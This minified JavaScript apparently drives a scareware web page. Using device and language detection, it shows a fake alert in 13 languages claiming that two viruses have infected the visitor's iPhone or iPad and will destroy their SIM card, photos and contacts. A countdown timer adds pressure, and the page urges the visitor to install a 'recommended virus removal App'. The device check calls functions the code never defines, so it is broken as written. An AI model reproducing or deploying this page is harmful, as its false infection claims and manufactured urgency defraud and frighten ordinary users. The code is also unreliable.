 (() => {
     "use strict";
     let e = {
         Linux: function() {
             return navigator.userAgent.match(/Linux/i)
         }
     };
     const t = e => {
             const t = !("undefined" == typeof window || !window.navigator && !navigator) && (window.navigator || navigator);
             return t && t.platform && (-1 !== t.platform.indexOf(e) || "MacIntel" === t.platform && t.maxTouchPoints > 1 && !window.MSStream)
         },
         i = e => 6e4 * e,
         n = e => {
             if ("number" != typeof e || e <= 0) return {
                 minutes: 0,
                 seconds: 0
             };
             const t = Math.floor(e / 1e3);
             return {
                 minutes: Math.floor(t / 60),
                 seconds: t % 60
             }
         },
         o = (e, t) => 1e3 * (60 * e + t),
         a = (e, t) => {
             localStorage.setItem(e, t)
         },
         r = (() => {
             let e = "0",
                 t = "0";
             return (i, n) => {
                 const o = 1 === String(i).length ? "0" + String(i) : String(i),
                     [a, r] = o.split("");
                 "0" !== e ? (a === e || (e = a), r === t ? document.getElementById(n).innerHTML = "<div>" + a + "</div><div>" + r + "</div>" : (t = r, document.getElementById(n).innerHTML = "<div>" + a + "</div><div class='countdown-list_item-num'>" + r + "</div>")) : document.getElementById(n).innerHTML = "<div>" + a + "</div><div>" + r + "</div>"
             }
         })(),
         s = (() => {
             let e = "0";
             return (t, i) => {
                 const n = 1 === String(t).length ? "0" + String(t) : String(t),
                     [o, a] = n.split("");
                 o === e ? document.getElementById(i).innerHTML = "<div>" + o + "</div><div class='countdown-list_item-num'>" + a + "</div>" : (e = o, document.getElementById(i).innerHTML = "<div class='countdown-list_item-first-num'>" + o + "</div><div class='countdown-list_item-num'>" + a + "</div>")
             }
         })(),
         l = e => {
             let t = (l = "startTime", localStorage.getItem(l));
             var l;
             t && 0 !== Number(t) || (a("startTime", i(e)), t = i(e)), r(n(Number(t)).minutes, "minutes"), s(n(Number(t)).seconds, "seconds"), (e => {
                 const t = 6e4,
                     i = new Date(+new Date + e).getTime(),
                     n = setInterval((function() {
                         const e = (new Date).getTime(),
                             l = i - e,
                             d = Math.floor(l % 36e5 / t),
                             u = Math.floor(l % t / 1e3);
                         r(d, "minutes"), s(u, "seconds"), o(d, u) <= 0 ? a("startTime", 0) : a("startTime", o(d, u)), l < 0 && (r(0, "minutes"), s(0, "seconds"), clearInterval(n))
                     }), 1e3)
             })(Number(t))
         };
     const d = {
             en: {
                 num: "2",
                 title1: "virus have been detected on your",
                 title2: "It has been infected and damaged",
                 description1: "We have detected that your",
                 description2: "has been infected with viruses. It will soon corrupt your sim card, data, photos and contacts if no immediate action is taken",
                 listTitle: "How to remove virus:",
                 listItem1: "Step 1: Tap the button below & go to App Store to Install the recommended virus removal App for free.",
                 listItem2: "Step 2: Run the app to remove all viruses.",
                 action: "Remove Virus Now"
             },
             fr: {
                 num: "2",
                 title1: "des virus ont été détectés sur votre",
                 title2: "Il a été infecté et endommagé",
                 description1: "Nous avons détecté que votre",
                 description2: "a été infecté par des virus. Il corrompra bientôt votre carte SIM, vos données, vos photos et vos contacts si aucune action immédiate n'est entreprise",
                 listTitle: "Comment supprimer le virus :",
                 listItem1: "Étape 1 : Appuyez sur le bouton ci-dessous et accédez à l'App Store pour installer l'application de suppression de virus recommandée gratuitement.",
                 listItem2: "Étape 2 : Exécutez l'application pour supprimer tous les virus.",
                 action: "Supprimer le virus maintenant"
             },
             es: {
                 num: "2",
                 title1: "se han detectado virus en tu",
                 title2: "Se ha infectado y dañado",
                 description1: "Hemos detectado que tu",
                 description2: "ha sido infectado por virus. Pronto corromperá tu tarjeta SIM, tus datos, tus fotos y tus contactos si no se toma una acción inmediata",
                 listTitle: "Cómo eliminar el virus:",
                 listItem1: "Paso 1: Toca el botón de abajo y ve a la App Store para instalar la aplicación recomendada para eliminar virus de forma gratuita.",
                 listItem2: "Paso 2: Ejecuta la aplicación para eliminar todos los virus.",
                 action: "Eliminar el virus ahora"
             },
             de: {
                 num: "2",
                 title1: "Viren wurden auf Ihrem",
                 title2: "Es wurde infiziert und beschädigt",
                 description1: "Wir haben festgestellt, dass Ihr",
                 description2: "mit Viren infiziert wurde. Es wird bald Ihre SIM-Karte, Daten, Fotos und Kontakte beschädigen, wenn keine sofortige Maßnahme ergriffen wird",
                 listTitle: "Wie man Viren entfernt:",
                 listItem1: "Schritt 1: Tippen Sie auf die Schaltfläche unten und gehen Sie zum App Store, um die empfohlene kostenlose Virenentfernungs-App zu installieren.",
                 listItem2: "Schritt 2: Führen Sie die App aus, um alle Viren zu entfernen.",
                 action: "Virus jetzt entfernen"
             },
             pt: {
                 num: "2",
                 title1: "foram detectados vírus no seu",
                 title2: "Ele foi infectado e danificado",
                 description1: "Detectamos que o seu",
                 description2: "foi infectado por vírus. Em breve, corromperá o seu cartão SIM, dados, fotos e contactos se não for tomada uma ação imediata",
                 listTitle: "Como remover o vírus:",
                 listItem1: "Passo 1: Toque no botão abaixo e vá para a App Store para instalar a aplicação recomendada para remover vírus gratuitamente.",
                 listItem2: "Passo 2: Execute a aplicação para remover todos os vírus.",
                 action: "Remover Vírus Agora"
             },
             ar: {
                 num: "2",
                 title1: "تم اكتشاف فيروسات على جهازك",
                 title2: "لقد تمت الإصابة والتلف",
                 description1: "لقد اكتشفنا أن جهازك",
                 description2: "تمت الإصابة بالفيروسات. ستفسد قريبًا بطاقة SIM الخاصة بك وبياناتك وصورك وجهات اتصالك إذا لم تتخذ إجراء فوري",
                 listTitle: "كيفية إزالة الفيروس:",
                 listItem1: "الخطوة 1: انقر على الزر أدناه وانتقل إلى متجر التطبيقات لتثبيت تطبيق إزالة الفيروس الموصى به مجانًا.",
                 listItem2: "الخطوة 2: تشغيل التطبيق لإزالة جميع الفيروسات.",
                 action: "إزالة الفيروس الآن"
             },
             ja: {
                 num: "2",
                 title1: "お使いのデバイスにウイルスが検出されました",
                 title2: "それは感染し、損傷しました",
                 description1: "お使いの",
                 description2: "にウイルスが感染していることを検出しました。すぐに行動を取らない場合、SIMカード、データ、写真、連絡先が壊れるおそれがあります",
                 listTitle: "ウイルスの除去方法：",
                 listItem1: "ステップ1：下のボタンをタップして、App Storeに移動して、無料で推奨されるウイルス除去アプリをインストールします。",
                 listItem2: "ステップ2：すべてのウイルスを削除するためにアプリを実行します。",
                 action: "今すぐウイルスを削除"
             },
             ko: {
                 num: "2",
                 title1: "귀하의 디바이스에서 바이러스가 감지되었습니다",
                 title2: "감염되었으며 손상되었습니다",
                 description1: "귀하의",
                 description2: "에 바이러스 감염이 감지되었습니다. 즉시 조치를 취하지 않으면 SIM 카드, 데이터, 사진 및 연락처가 곧 손상될 수 있습니다",
                 listTitle: "바이러스 제거 방법:",
                 listItem1: "단계 1 : 아래 버튼을 탭하고 App Store로 이동하여 무료로 추천되는 바이러스 제거 앱을 설치하십시오.",
                 listItem2: "단계 2 : 모든 바이러스를 제거하기 위해 앱을 실행하십시오.",
                 action: "지금 바이러스 제거"
             },
             tr: {
                 num: "2",
                 title1: "Cihazınızda virüs tespit edildi",
                 title2: "Enfekte oldu ve hasar gördü",
                 description1: "Cihazınızda",
                 description2: "virüs bulaştığını tespit ettik. Anında önlem alınmazsa SIM kartınız, verileriniz, fotoğraflarınız ve kişileriniz yakında zarar görebilir",
                 listTitle: "Virüs Nasıl Kaldırılır:",
                 listItem1: "Adım 1: Aşağıdaki düğmeye dokunun ve Ücretsiz önerilen virüs kaldırma uygulamasını yüklemek için App Store'a gidin.",
                 listItem2: "Adım 2: Tüm virüsleri kaldırmak için uygulamayı çalıştırın.",
                 action: "Şimdi Virüsü Kaldır"
             },
             it: {
                 num: "2",
                 title1: "sono stati rilevati virus sul tuo",
                 title2: "È stato infettato e danneggiato",
                 description1: "Abbiamo rilevato che il tuo",
                 description2: "è stato infettato da virus. Presto corromperà la tua scheda SIM, i tuoi dati, le tue foto e i tuoi contatti se non verrà adottata immediata",
                 listTitle: "Come rimuovere il virus:",
                 listItem1: "Passaggio 1: Tocca il pulsante qui sotto e vai su App Store per installare l'app di rimozione virus consigliata gratuitamente.",
                 listItem2: "Passaggio 2: Esegui l'app per rimuovere tutti i virus.",
                 action: "Rimuovi Virus Ora"
             },
             nl: {
                 num: "2",
                 title1: "er zijn virussen gedetecteerd op uw",
                 title2: "Het is geïnfecteerd en beschadigd",
                 description1: "We hebben gedetecteerd dat uw",
                 description2: "is geïnfecteerd met virussen. Als er geen onmiddellijke actie wordt ondernomen, zal het binnenkort uw simkaart, gegevens, foto's en contacten beschadigen",
                 listTitle: "Hoe virussen te verwijderen:",
                 listItem1: "Stap 1: Tik op de onderstaande knop en ga naar de App Store om de aanbevolen gratis virussen verwijderende app te installeren.",
                 listItem2: "Stap 2: Voer de app uit om alle virussen te verwijderen.",
                 action: "Verwijder Virus Nu"
             },
             el: {
                 num: "2",
                 title1: "έχουν ανιχνευθεί ιοί στο",
                 title2: "Έχει μολυνθεί και έχει υποστεί ζημιές",
                 description1: "Έχουμε ανιχνεύσει ότι το",
                 description2: "έχει μολυνθεί από ιούς. Θα καταστρέψει σύντομα την κάρτα SIM, τα δεδομένα, τις φωτογραφίες και τις επαφές σας αν δεν ληφθεί άμεση δράση",
                 listTitle: "Πώς να αφαιρέσετε τον ιό:",
                 listItem1: "Βήμα 1: Πατήστε το παρακάτω κουμπί και μεταβείτε στο App Store για να εγκαταστήσετε τη συνιστώμενη εφαρμογή δωρεάν αφαίρεσης ιού.",
                 listItem2: "Βήμα 2: Εκτελέστε την εφαρμογή για να αφαιρέσετε όλους τους ιούς.",
                 action: "Αφαίρεση Ιού Τώρα"
             },
             pl: {
                 num: "2",
                 title1: "zostały wykryte wirusy na twoim",
                 title2: "Został zainfekowany i uszkodzony",
                 description1: "Wykryliśmy, że twój",
                 description2: "został zainfekowany przez wirusy. Wkrótce uszkodzi twoją kartę SIM, dane, zdjęcia i kontakty, jeśli nie zostaną podjęte natychmiastowe działania",
                 listTitle: "Jak usunąć wirusa:",
                 listItem1: "Krok 1: Naciśnij poniższy przycisk i przejdź do App Store, aby zainstalować polecane darmowe oprogramowanie do usuwania wirusów.",
                 listItem2: "Krok 2: Uruchom aplikację, aby usunąć wszystkie wirusy.",
                 action: "Usuń Wirusa Teraz"
             }
         },
         u = ["en", "fr", "es", "de", "pt", "ar", "ja", "ko", "tr", "it", "nl", "el", "pl"],
         c = navigator && navigator.language || "en";
     document.addEventListener("DOMContentLoaded", (function() {
             const i = (() => {
                     const e = c.slice(0, 2);
                     return u.includes(e) ? e : "en"
                 })(),
                 n = d[i];
             let o = document.getElementById("preloader");
             const a = (() => {
                 const e = new Date,
                     t = navigator && navigator.language || "en-US";
                 return {
                     localeMonth: (new Date).toLocaleDateString(t || "en-US", {
                         month: "long"
                     }),
                     localeDate: e.getDate(),
                     localeYear: e.getFullYear()
                 }
             })();
             var r;
             document.getElementById("date").innerText = `${r=a.localeMonth,r[0].toUpperCase()+r.slice(1)} ${a.localeDate}, ${a.localeYear}`, l(3);
             const s = (() => {
                 let i = "";
                 const n = e.iphone(),
                     o = e.ipad() || t("iPad");
                 return n && (i = "iPhone"), o && (i = "iPad"), n || o || (i = "iPhone"), i
             })();
             [{
                 id: "bodyTitle",
                 content: `<span class="red-text">(${n.num})</span> ${n.title1} ${s}. ${n.title2}.`,
                 type: "html"
             }, {
                 id: "bodyDescription",
                 content: `${n.description1} ${s} ${n.description2}`,
                 type: "html"
             }, {
                 id: "listTitle",
                 content: n.listTitle,
                 type: "text"
             }, {
                 id: "listItem1",
                 content: n.listItem1,
                 type: "text"
             }, {
                 id: "listItem2",
                 content: n.listItem2,
                 type: "text"
             }, {
                 id: "action",
                 content: n.action,
                 type: "text"
             }].forEach((({
                 id: e,
                 content: t,
                 type: i
             }) => {
                 const n = document.getElementById(e);
                 n && "html" === i && (n.innerHTML = t), n && "text" === i && (n.textContent = t)
             })), o.style.display = "none", document.body.style.overflow = "visible"
         })), window.FLS = !0,
         function(e) {
             let t = new Image;
             t.onload = t.onerror = function() {
                 e(2 == t.height)
             }, t.src = "data:image/webp;base64,UklGRjoAAABXRUJQVlA4IC4AAACyAgCdASoCAAIALmk0mk0iIiIiIgBoSygABc6WWgAA/veff/0PP8bA//LwYAAA"
         }((function(e) {
             let t = !0 === e ? "webp" : "no-webp";
             document.documentElement.classList.add(t)
         }))
 })();
